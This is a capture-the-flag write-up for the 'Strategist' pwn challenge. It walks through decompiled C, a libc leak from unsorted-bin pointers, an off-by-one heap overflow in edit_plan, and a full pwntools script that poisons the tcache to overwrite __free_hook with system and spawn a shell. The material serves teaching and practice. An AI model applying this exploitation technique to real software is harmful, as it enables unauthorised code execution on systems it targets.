* Description

To move forward, Sir Alaric requests each member of his team to present their most effective
planning strategy. The individual with the strongest plan will be appointed as the Strategist for
the upcoming war. Put forth your best effort to claim the role of Strategist!

* Solution

#+begin_src bash
pwndbg> checksec
File:     /home/curtain/Documents/ctf/2025/apocalypse-35/pwn/strategist/dist/strategist
Arch:     amd64
RELRO:      Full RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        PIE enabled
RUNPATH:    b'./glibc/'
Stripped:   No
#+end_src


~main~ function:
#+begin_src c
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  unsigned __int64 n2; // rax
  _BYTE s[808]; // [rsp+0h] [rbp-330h] BYREF
  unsigned __int64 v5; // [rsp+328h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  memset(s, 0, 0x320u);
  banner();
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        n2 = menu();
        if ( n2 != 2 )
          break;
        show_plan(s);
      }
      if ( n2 > 2 )
        break;
      if ( n2 != 1 )
        goto LABEL_13;
      create_plan(s);
    }
    if ( n2 == 3 )
    {
      edit_plan(s);
    }
    else
    {
      if ( n2 != 4 )
      {
LABEL_13:
        printf("%s\n[%sSir Alaric%s]: This plan will lead us to defeat!\n\n", "\x1B[1;31m", "\x1B[1;33m", "\x1B[1;31m");
        exit(1312);
      }
      delete_plan(s);
    }
  }
}
#+end_src

Very normal program at first glance with *CURD*, let's dive into separately.
~create_plan~:
#+begin_src c
unsigned __int64 __fastcall create_plan(__int64 a1)
{
  int size; // [rsp+18h] [rbp-18h] BYREF
  int v3; // [rsp+1Ch] [rbp-14h]
  void *buf; // [rsp+20h] [rbp-10h]
  unsigned __int64 v5; // [rsp+28h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  v3 = check(a1);
  if ( v3 == -1 )
  {
    printf("%s\n[%sSir Alaric%s]: Don't go above your head kiddo!\n\n", "\x1B[1;31m", "\x1B[1;33m", "\x1B[1;31m");
    exit(1312);
  }
  printf("%s\n[%sSir Alaric%s]: How long will be your plan?\n\n> ", "\x1B[1;34m", "\x1B[1;33m", "\x1B[1;34m");
  size = 0;
  __isoc99_scanf("%d", &size);
  buf = malloc(size);
  if ( !buf )
  {
    printf("%s\n[%sSir Alaric%s]: This plan will be a grand failure!\n\n", "\x1B[1;31m", "\x1B[1;33m", "\x1B[1;31m");
    exit(1312);
  }
  printf("%s\n[%sSir Alaric%s]: Please elaborate on your plan.\n\n> ", "\x1B[1;34m", "\x1B[1;33m", "\x1B[1;34m");
  read(0, buf, size);
  *(_QWORD *)(a1 + 8LL * v3) = buf;
  printf(
    "%s\n[%sSir Alaric%s]: The plan might work, we'll keep it in mind.\n\n",
    "\x1B[1;32m",
    "\x1B[1;33m",
    "\x1B[1;32m");
  return __readfsqword(0x28u) ^ v5;
}
#+end_src

~show_plan~:
#+begin_src c
unsigned __int64 __fastcall show_plan(__int64 a1)
{
  signed int n0x64; // [rsp+14h] [rbp-Ch] BYREF
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  printf("%s\n[%sSir Alaric%s]: Which plan you want to view?\n\n> ", "\x1B[1;34m", "\x1B[1;33m", "\x1B[1;34m");
  n0x64 = 0;
  __isoc99_scanf("%d", &n0x64);
  if ( (unsigned int)n0x64 >= 0x64 || !*(_QWORD *)(8LL * n0x64 + a1) )
  {
    printf("%s\n[%sSir Alaric%s]: There is no such plan!\n\n", "\x1B[1;31m", "\x1B[1;33m", "\x1B[1;31m");
    exit(1312);
  }
  printf(
    "%s\n[%sSir Alaric%s]: Plan [%d]: %s\n",
    "\x1B[1;34m",
    "\x1B[1;33m",
    "\x1B[1;34m",
    n0x64,
    *(const char **)(8LL * n0x64 + a1));
  return __readfsqword(0x28u) ^ v3;
}
#+end_src

~edit_plan~:
#+begin_src c
unsigned __int64 __fastcall edit_plan(__int64 a1)
{
  size_t nbytes; // rax
  signed int n0x64; // [rsp+14h] [rbp-Ch] BYREF
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  printf("%s\n[%sSir Alaric%s]: Which plan you want to change?\n\n> ", "\x1B[1;34m", "\x1B[1;33m", "\x1B[1;34m");
  n0x64 = 0;
  __isoc99_scanf("%d", &n0x64);
  if ( (unsigned int)n0x64 >= 0x64 || !*(_QWORD *)(8LL * n0x64 + a1) )
  {
    printf("%s\n[%sSir Alaric%s]: There is no such plan!\n\n", "\x1B[1;31m", "\x1B[1;33m", "\x1B[1;31m");
    exit(1312);
  }
  printf("%s\n[%sSir Alaric%s]: Please elaborate on your new plan.\n\n> ", "\x1B[1;34m", "\x1B[1;33m", "\x1B[1;34m");
  nbytes = strlen(*(const char **)(8LL * n0x64 + a1));
  read(0, *(void **)(8LL * n0x64 + a1), nbytes);
  putchar(10);
  return __readfsqword(0x28u) ^ v4;
}
#+end_src

~delete_plan~:
#+begin_src c
unsigned __int64 __fastcall delete_plan(__int64 a1)
{
  signed int n0x64; // [rsp+14h] [rbp-Ch] BYREF
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  printf("%s\n[%sSir Alaric%s]: Which plan you want to delete?\n\n> ", "\x1B[1;34m", "\x1B[1;33m", "\x1B[1;34m");
  n0x64 = 0;
  __isoc99_scanf("%d", &n0x64);
  if ( (unsigned int)n0x64 >= 0x64 || !*(_QWORD *)(8LL * n0x64 + a1) )
  {
    printf("%s\n[%sSir Alaric%s]: There is no such plan!\n\n", "\x1B[1;31m", "\x1B[1;33m", "\x1B[1;31m");
    exit(1312);
  }
  free(*(void **)(8LL * n0x64 + a1));
  *(_QWORD *)(8LL * n0x64 + a1) = 0;
  printf("%s\n[%sSir Alaric%s]: We will remove this plan!\n\n", "\x1B[1;32m", "\x1B[1;33m", "\x1B[1;32m");
  return __readfsqword(0x28u) ^ v3;
}
#+end_src

** Libc address leak

Cause this program has =FULL= protection enabled, we need to leak =libc= address to defeat =PIE=. When we
look these four functions carefully, we can leverage the fact which *malloc's memory from  =unsorted
bins= will not clear =fd= and =bk= pointers*. After that, we can call ~show_plan~ to leak the libc address.

#+begin_src bash
pwndbg> x/20gx 0x555555604660
0x555555604660: 0x0000000000000000      0x0000000000000511
0x555555604670: 0x4343434343434343      0x00007ffff7bebca0
0x555555604680: 0x0000000000000000      0x0000000000000000
0x555555604690: 0x0000000000000000      0x0000000000000000
0x5555556046a0: 0x0000000000000000      0x0000000000000000
0x5555556046b0: 0x0000000000000000      0x0000000000000000
0x5555556046c0: 0x0000000000000000      0x0000000000000000
0x5555556046d0: 0x0000000000000000      0x0000000000000000
0x5555556046e0: 0x0000000000000000      0x0000000000000000
0x5555556046f0: 0x0000000000000000      0x0000000000000000
#+end_src

We can see that ~0x555555604678~ is a pointer to ~arena.bins~.

#+begin_src bash
pwndbg> arena
Arena for thread 1 is located at: 0x7ffff7bebc40
{
  mutex = 0,
  flags = 0,
  have_fastchunks = 0,
  fastbinsY = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0},
  top = 0x555555604ba0,
  last_remainder = 0x0,
  bins = {0x555555604660, 0x555555604660, 0x7ffff7bebcb0, 0x7ffff7bebcb0, 0x7ffff7bebcc0, 0x7ffff7bebcc0, 0x7ffff7bebcd0, 0x7ffff7bebcd0, 0x7ffff7bebce0, 0x7ffff7bebce0, 0x7ffff7bebcf0, 0x7ffff7bebcf0, 0x7ffff7bebd00, 0x7ffff7bebd00, 0x7ffff7bebd10, 0x7ffff7bebd10, 0x7ffff7bebd20, 0x7ffff7bebd20, 0x7ffff7bebd30, 0x7ffff7bebd30, 0x7ffff7bebd40, 0x7ffff7bebd40, 0x7ffff7bebd50, 0x7ffff7bebd50, 0x7ffff7bebd60, 0x7ffff7bebd60, 0x7ffff7bebd70, 0x7ffff7bebd70, 0x7ffff7bebd80, 0x7ffff7bebd80, 0x7ffff7bebd90, 0x7ffff7bebd90, 0x7ffff7bebda0, 0x7ffff7bebda0, 0x7ffff7bebdb0, 0x7ffff7bebdb0, 0x7ffff7bebdc0, 0x7ffff7bebdc0, 0x7ffff7bebdd0, 0x7ffff7bebdd0, 0x7ffff7bebde0, 0x7ffff7bebde0, 0x7ffff7bebdf0, 0x7ffff7bebdf0, 0x7ffff7bebe00, 0x7ffff7bebe00, 0x7ffff7bebe10, 0x7ffff7bebe10, 0x7ffff7bebe20, 0x7ffff7bebe20, 0x7ffff7bebe30, 0x7ffff7bebe30, 0x7ffff7bebe40, 0x7ffff7bebe40, 0x7ffff7bebe50, 0x7ffff7bebe50, 0x7ffff7bebe60, 0x7ffff7bebe60, 0x7ffff7bebe70, 0x7ffff7bebe70, 0x7ffff7bebe80, 0x7ffff7bebe80, 0x7ffff7bebe90, 0x7ffff7bebe90, 0x7ffff7bebea0, 0x7ffff7bebea0, 0x7ffff7bebeb0, 0x7ffff7bebeb0, 0x7ffff7bebec0, 0x7ffff7bebec0, 0x7ffff7bebed0, 0x7ffff7bebed0, 0x7ffff7bebee0, 0x7ffff7bebee0, 0x7ffff7bebef0, 0x7ffff7bebef0, 0x7ffff7bebf00, 0x7ffff7bebf00, 0x7ffff7bebf10, 0x7ffff7bebf10, 0x7ffff7bebf20, 0x7ffff7bebf20, 0x7ffff7bebf30, 0x7ffff7bebf30, 0x7ffff7bebf40, 0x7ffff7bebf40, 0x7ffff7bebf50, 0x7ffff7bebf50, 0x7ffff7bebf60, 0x7ffff7bebf60, 0x7ffff7bebf70, 0x7ffff7bebf70, 0x7ffff7bebf80, 0x7ffff7bebf80, 0x7ffff7bebf90, 0x7ffff7bebf90, 0x7ffff7bebfa0, 0x7ffff7bebfa0, 0x7ffff7bebfb0, 0x7ffff7bebfb0, 0x7ffff7bebfc0, 0x7ffff7bebfc0, 0x7ffff7bebfd0, 0x7ffff7bebfd0, 0x7ffff7bebfe0, 0x7ffff7bebfe0, 0x7ffff7bebff0, 0x7ffff7bebff0, 0x7ffff7bec000, 0x7ffff7bec000, 0x7ffff7bec010, 0x7ffff7bec010, 0x7ffff7bec020, 0x7ffff7bec020, 0x7ffff7bec030, 0x7ffff7bec030, 0x7ffff7bec040, 0x7ffff7bec040, 0x7ffff7bec050, 0x7ffff7bec050, 0x7ffff7bec060, 0x7ffff7bec060, 0x7ffff7bec070, 0x7ffff7bec070, 0x7ffff7bec080, 0x7ffff7bec080, 0x7ffff7bec090, 0x7ffff7bec090, 0x7ffff7bec0a0, 0x7ffff7bec0a0, 0x7ffff7bec0b0, 0x7ffff7bec0b0, 0x7ffff7bec0c0, 0x7ffff7bec0c0, 0x7ffff7bec0d0, 0x7ffff7bec0d0, 0x7ffff7bec0e0, 0x7ffff7bec0e0, 0x7ffff7bec0f0, 0x7ffff7bec0f0, 0x7ffff7bec100, 0x7ffff7bec100, 0x7ffff7bec110, 0x7ffff7bec110, 0x7ffff7bec120, 0x7ffff7bec120, 0x7ffff7bec130, 0x7ffff7bec130, 0x7ffff7bec140, 0x7ffff7bec140, 0x7ffff7bec150, 0x7ffff7bec150, 0x7ffff7bec160, 0x7ffff7bec160, 0x7ffff7bec170, 0x7ffff7bec170, 0x7ffff7bec180, 0x7ffff7bec180, 0x7ffff7bec190, 0x7ffff7bec190, 0x7ffff7bec1a0, 0x7ffff7bec1a0, 0x7ffff7bec1b0, 0x7ffff7bec1b0, 0x7ffff7bec1c0, 0x7ffff7bec1c0, 0x7ffff7bec1d0, 0x7ffff7bec1d0, 0x7ffff7bec1e0, 0x7ffff7bec1e0, 0x7ffff7bec1f0, 0x7ffff7bec1f0, 0x7ffff7bec200, 0x7ffff7bec200, 0x7ffff7bec210, 0x7ffff7bec210, 0x7ffff7bec220, 0x7ffff7bec220, 0x7ffff7bec230, 0x7ffff7bec230, 0x7ffff7bec240, 0x7ffff7bec240, 0x7ffff7bec250, 0x7ffff7bec250, 0x7ffff7bec260, 0x7ffff7bec260, 0x7ffff7bec270, 0x7ffff7bec270, 0x7ffff7bec280, 0x7ffff7bec280, 0x7ffff7bec290, 0x7ffff7bec290, 0x7ffff7bec2a0, 0x7ffff7bec2a0, 0x7ffff7bec2b0, 0x7ffff7bec2b0, 0x7ffff7bec2c0, 0x7ffff7bec2c0, 0x7ffff7bec2d0, 0x7ffff7bec2d0...},
  binmap = {0, 0, 0, 0},
  next = 0x7ffff7bebc40,
  next_free = 0x0,
  attached_threads = 1,
  system_mem = 135168,
  max_system_mem = 135168,
}
#+end_src

** Overflow

In function ~edit_plan~, there exist a buffer overflow, since the *strlen only stop at null terminator
(0x00)*, which will cause out-of-bounds write. Here is ~off-by-one~. see following analysis for details:
#+begin_src c
nbytes = strlen(*(const char **)(8LL * n0x64 + a1));
read(0, *(void **)(8LL * n0x64 + a1), nbytes);
#+end_src

We first malloc three chunks with following layout:
#+begin_src bash
pwndbg> heap
pwndbg will try to resolve the heap symbols via heuristic now since we cannot resolve the heap via the debug symbols.
This might not work in all cases. Use `help set resolve-heap-via-heuristic` for more details.

Allocated chunk | PREV_INUSE
Addr: 0x555555604000
Size: 0x250 (with flag bits: 0x251)

Free chunk (tcachebins) | PREV_INUSE
Addr: 0x555555604250
Size: 0x410 (with flag bits: 0x411)
fd: 0x00

Allocated chunk | PREV_INUSE
Addr: 0x555555604660
Size: 0x20 (with flag bits: 0x21)

Allocated chunk | PREV_INUSE
Addr: 0x555555604680
Size: 0x20 (with flag bits: 0x21)

Allocated chunk | PREV_INUSE
Addr: 0x5555556046a0
Size: 0x20 (with flag bits: 0x21)

Top chunk | PREV_INUSE
Addr: 0x5555556046c0
Size: 0x20940 (with flag bits: 0x20941)

pwndbg> x/20gx 0x555555604660
0x555555604660: 0x0000000000000000      0x0000000000000021
0x555555604670: 0x4141414141414141      0x4141414141414141
0x555555604680: 0x0a41414141414141      0x0000000000000021
0x555555604690: 0x4242424242424242      0x4242424242424242
0x5555556046a0: 0x0a42424242424242      0x0000000000000021
0x5555556046b0: 0x4343434343434343      0x4343434343434343
0x5555556046c0: 0x0a43434343434343      0x0000000000020941
0x5555556046d0: 0x0000000000000000      0x0000000000000000
0x5555556046e0: 0x0000000000000000      0x0000000000000000
0x5555556046f0: 0x0000000000000000      0x0000000000000000
#+end_src

#+begin_quote
NOTE: Here we need to leverage the fact that malloc will reuse the ~prev_size~ field when ~PREV_IUSE~
flag set; and chunk_ptr must alignment to ~0xf~.
#+end_quote

then, ~edit_plan~ with first chunk and ~strlen~ will return ~off-by-one~ size, which include next chunk's
size.
#+begin_src bash
pwndbg> x/20gx 0x555555604660
0x555555604660: 0x0000000000000000      0x0000000000000021
0x555555604670: 0x4141414141414141      0x4141414141414141
0x555555604680: 0x4141414141414141      0x0000000000000031
0x555555604690: 0x4242424242424242      0x4242424242424242
0x5555556046a0: 0x0a42424242424242      0x0000000000000021
0x5555556046b0: 0x4343434343434343      0x4343434343434343
0x5555556046c0: 0x0a43434343434343      0x0000000000020941
0x5555556046d0: 0x0000000000000000      0x0000000000000000
0x5555556046e0: 0x0000000000000000      0x0000000000000000
0x5555556046f0: 0x0000000000000000      0x0000000000000000
pwndbg>
#+end_src

Now, the second chunk's size has beed tampered to ~0x31~. But for this challenge, we need to tamper
this value with ~0x41~ at least, cause we need to overwrite next chunk's ~next~ field.

After we control(overwrite) what next field of tcache (here is ~__free_hook~), we can malloc to get
that address and write ~libc.system~ to it. So when we call ~free~ with ~/bin/sh~ arguments next time.
this shellcode got trigger.

#+begin_src python :results output
#!/usr/bin/env python3

from pwn import *
import warnings

warnings.filterwarnings('ignore')

context.arch = 'amd64'

fname = './strategist'
if args.GDB:
    io = gdb.debug(fname, '''
    b show_plan
    c
''')
else:
    io = process(fname)
libc = io.libc

sla = lambda x, y: io.sendlineafter(x, y)
sa = lambda x, y: io.sendafter(x, y)
ru = lambda x: io.recvuntil(x)
rl = lambda: io.recvline()


def create(size, data):
   sla('> ', '1') 
   sla('> ', str(size))
   sa('> ', data)
   
def show(idx):
    sla('> ', '2')
    sla('> ', str(idx))
    ru('AAAAAAAA')
    arena_addr = u64(rl().strip().ljust(8, b'\x00'))
    print(f'arena address: {arena_addr:#x}')
    return arena_addr - 0x3ebca0  # get from debug

def edit(idx, data):
    sla('> ', '3')
    sla('> ', str(idx))
    sa('> ', data)
    
def delete(idx):
    sla('> ', '4')
    sla('> ', str(idx))

    
# leak libc address
# size must > 0x408, which is max tcache size
create(0x420, 'beef')
create(0x100, 'cafe')
delete(0)
delete(1)
create(0x420, 'AAAAAAAA')

libc.address = show(0)
print(f'libc address: {libc.address:#x}')
delete(0)

# overwrite next pointer of tcache
create(0x18, 'a'*0x18)
create(0x18, 'b'*0x18)
create(0x18, 'c'*0x18)
edit(0,b'a'*0x18 + p8(0x41))
delete(1)
delete(2)
create(0x30, b'a'*0x20 + p64(libc.sym.__free_hook))
create(0x18, b'/bin/sh\x00')
create(0x18, p64(libc.sym.system))
delete(2)

pause(1)
io.interactive()
#+end_src
